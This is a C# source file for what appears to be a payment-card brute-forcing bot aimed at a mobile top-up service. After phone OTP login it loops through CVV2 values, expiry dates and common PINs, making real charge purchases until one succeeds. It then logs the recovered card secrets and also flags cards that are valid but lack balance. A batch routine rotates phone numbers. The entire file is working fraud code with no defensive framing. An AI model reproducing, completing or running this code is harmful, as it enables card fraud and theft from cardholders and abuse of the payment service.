using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;

namespace IvaScanner.Core
{
    public class IvaScannerBot
    {
        private readonly IvaOptions _options;
        private readonly string[] _pins = { "1234", "1111", "0000", "4321", "2222", "5555", "1212", "1122" };

        public IvaScannerBot(IvaOptions? options = null)
        {
            _options = options ?? new IvaOptions();
        }

        private IEnumerable<string> GetCvv2List()
        {
            for (int i = 100; i <= 9999; i++)
                yield return i.ToString();
        }

        private IEnumerable<(string Month, string Year)> GetExpiryDates()
        {
            var months = Enumerable.Range(1, 12).Select(m => m.ToString("D2"));
            var years = Enumerable.Range(1406, 5).Select(y => y.ToString());
            
            foreach (var year in years)
                foreach (var month in months)
                    yield return (month, year);
        }

        public async Task<CardInfo> ScanCardAsync(string pan, string phoneNumber, 
            Action<string>? logAction = null, CancellationToken ct = default)
        {
            var result = new CardInfo 
            { 
                Pan = pan, 
                Success = false,
                PhoneUsed = phoneNumber,
                ErrorMessage = "Failed",
                TestsPerformed = 0
            };

            using var client = new IvaAuthClient(_options);
            var log = logAction ?? Console.WriteLine;

            try
            {
                log($"[+] Fetching public key...");
                await client.FetchPublicKeyAsync(ct: ct);
                
                log($"[+] Key exchange...");
                await client.KeyExchangeAsync(ct);
                
                log($"[+] Requesting OTP for {phoneNumber}...");
                var otp = await client.RequestOtpAsync(phoneNumber, ct);
                
                log($"[+] Verification code sent to {phoneNumber}.");
                log("[?] Enter 6-digit code (or 'skip' to cancel): ");
                var code = Console.ReadLine()?.Trim();

                
                if (string.IsNullOrEmpty(code) || code.ToLower() == "skip")
                {
                    result.ErrorMessage = "Skipped by user";
                    return result;
                }

                log($"[+] Verifying code...");
                await client.VerifyCodeAsync(code, otp.Token, otp.ReagentNumber, ct);
                log($"[+] Authentication successful for {phoneNumber}!");

                log($"[+] Fetching charge catalog...");
                var catalog = await client.GetChargeCatalogAsync(ct);
                var providerId = catalog.FirstOrDefault()?.Id ?? "10";
                log($"[+] Operator: {catalog.FirstOrDefault()?.Name ?? "Unknown"}");

                var cvv2List = GetCvv2List().ToList();
                var expiryDates = GetExpiryDates().ToList();
                var pinList = _pins;
                
                int totalTests = cvv2List.Count * expiryDates.Count * pinList.Length;
                int currentTest = 0;
                
                log($"[+] Total combinations to test: {totalTests:N0}");
                log($"[+] CVV2 range: 100-9999 ({cvv2List.Count:N0} values)");
                log($"[+] Expiry: 1406-1410 with all months ({expiryDates.Count} values)");
                log($"[+] Pins: {string.Join(", ", pinList)}");
                log($"[+] This may take a very long time...");

                foreach (var (month, year) in expiryDates)
                {
                    foreach (var cvv2 in cvv2List)
                    {
                        foreach (var pin in pinList)
                        {
                            currentTest++;
                            result.TestsPerformed = currentTest;
                            
                            if (ct.IsCancellationRequested) return result;

                            if (currentTest % 100 == 0 || currentTest == 1)
                            {
                                var percent = 100.0 * currentTest / totalTests;
                                log($"[*] Progress: {currentTest:N0}/{totalTests:N0} ({percent:F2}%) - Testing {month}/{year} CVV:{cvv2} PIN:{pin}");
                            }

                            try
                            {
                                var chargeResult = await client.BuyChargeAsync(new ChargePurchaseRequest
                                {
                                    Amount = 10000,
                                    TargetMobileNo = phoneNumber,
                                    ProviderId = providerId,
                                    Card = new CardPayment
                                    {
                                        Pan = pan,
                                        Cvv2 = cvv2,
                                        ExpireMonth = month,
                                        ExpireYear = year,
                                        Pin = pin
                                    }
                                }, ct);

                                if (chargeResult.Success)
                                {
                                    result.Success = true;
                                    result.ExpireMonth = month;
                                    result.ExpireYear = year;
                                    result.Cvv2 = cvv2;
                                    result.Pin = pin;
                                    result.OperatorName = chargeResult.OperatorName;
                                    result.FactorNumber = chargeResult.FactorNumber;
                                    result.ErrorMessage = "Success";

                                    log($"\n[+] ✅✅✅ VALID CARD FOUND! ✅✅✅");
                                    log($"[+] 📅 Expiry: {month}/{year}");
                                    log($"[+] 🔐 CVV2: {cvv2}");
                                    log($"[+] 🔑 PIN: {pin}");
                                    log($"[+] 📱 Phone: {phoneNumber}");
                                    if (!string.IsNullOrEmpty(chargeResult.FactorNumber))
                                        log($"[+] 📄 Factor: {chargeResult.FactorNumber}");
                                    log($"[+] 🔢 Tests performed: {currentTest:N0}");
                                    
                                    return result;
                                }
                                else if (chargeResult.Message?.Contains("موجودی") == true ||
                                         chargeResult.Message?.Contains("اعتبار") == true)
                                {
                                    log($"\n[!] ⚠️ CARD IS VALID but insufficient balance!");
                                    log($"[!] 📅 Expiry: {month}/{year}");
                                    log($"[!] 🔐 CVV2: {cvv2}");
                                    log($"[!] 🔑 PIN: {pin}");
                                    
                                    result.Success = true;
                                    result.ExpireMonth = month;
                                    result.ExpireYear = year;
                                    result.Cvv2 = cvv2;
                                    result.Pin = pin;
                                    result.OperatorName = chargeResult.OperatorName;
                                    result.ErrorMessage = "Insufficient balance";
                                    return result;
                                }
                                else if (chargeResult.Message?.Contains("CVV") == true || 
                                         chargeResult.Message?.Contains("رمز") == true ||
                                         chargeResult.Message?.Contains("اطلاعات") == true)
                                {
                                    // اطلاعات نادرست - ادامه
                                }
                                else if (chargeResult.Message?.Contains("محدودیت") == true)
                                {
                                    log($"[-] ⏳ Daily limit reached, waiting 5s...");
                                    await Task.Delay(5000, ct);
                                }
                                else if (chargeResult.Message?.Contains("کارت") == true ||
                                         chargeResult.Message?.Contains("مسدود") == true)
                                {
                                    log($"[-] 🚫 Card issue: {chargeResult.Message}");
                                    result.ErrorMessage = chargeResult.Message;
                                    return result;
                                }
                            }
                            catch (Exception ex)
                            {
                                if (currentTest % 1000 == 0)
                                    log($"[-] Error at test {currentTest}: {ex.Message}");
                            }

                            // تأخیر بین درخواست‌ها
                            await Task.Delay(150, ct);
                        }
                    }
                }

                result.ErrorMessage = $"All {totalTests:N0} combinations tested, none succeeded";
                log($"[-] ❌ No valid combination found after {totalTests:N0} tests");
                return result;
            }
            catch (Exception ex)
            {
                result.ErrorMessage = $"Error: {ex.Message}";
                log($"[-] ❌ General error: {ex.Message}");
                return result;
            }
        }

        public async Task BatchScanAsync(string pan, string[] phones, Action<string>? logAction = null)
        {
            var log = logAction ?? Console.WriteLine;
            var results = new List<CardInfo>();

            log($"\n[+] ========================================");
            log($"[+] Starting scan for card: {pan}");
            log($"[+] Number of phones: {phones.Length}");
            log($"[+] ========================================\n");

            foreach (var phone in phones)
            {
                log($"\n[+] ========== Trying with number: {phone} ==========");
                
                var result = await ScanCardAsync(pan, phone, logAction: log);
                results.Add(result);

                if (result.Success)
                {
                    log($"\n[+] 🎉🎉🎉 CARD SUCCESSFULLY IDENTIFIED! 🎉🎉🎉");
                    log($"[+] Phone: {phone}");
                    log($"[+] Info: {System.Text.Json.JsonSerializer.Serialize(result, new System.Text.Json.JsonSerializerOptions { WriteIndented = true })}");
                    break;
                }

                log($"[-] ❌ Failed with {phone}: {result.ErrorMessage}");
                log($"[-] Waiting 3 seconds before next number...");
                await Task.Delay(3000);
            }

            log($"\n[+] ========================================");
            log($"[+] FINAL REPORT:");
            log($"[+] ========================================");
            foreach (var r in results)
            {
                var status = r.Success ? "✅ SUCCESS" : $"❌ Failed - {r.ErrorMessage}";
                log($"[+] {r.PhoneUsed}: {status}");
                if (r.Success)
                {
                    log($"[+]     Expiry: {r.ExpireMonth}/{r.ExpireYear}");
                    log($"[+]     CVV2: {r.Cvv2}");
                    log($"[+]     PIN: {r.Pin}");
                    log($"[+]     Tests: {r.TestsPerformed:N0}");
                }
            }
            log($"[+] ========================================");
        }
    }
}